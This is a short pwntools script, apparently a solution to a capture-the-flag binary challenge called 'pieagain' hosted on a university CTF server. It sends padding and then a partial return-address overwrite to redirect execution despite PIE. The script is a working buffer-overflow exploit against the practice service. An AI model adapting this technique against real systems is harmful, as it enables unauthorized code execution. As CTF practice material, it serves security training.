from pwn import *

io = remote("pwn1.0ops.sjtu.cn", 10008)
elf = ELF('./pieagain')

print(io.recvline())

io.send(b"A"*0x1f)

print(io.recvline())
ret = b'\x94'
io.send(b'A'*0x2c + b'\x00'*4 + ret)

print(io.recvline())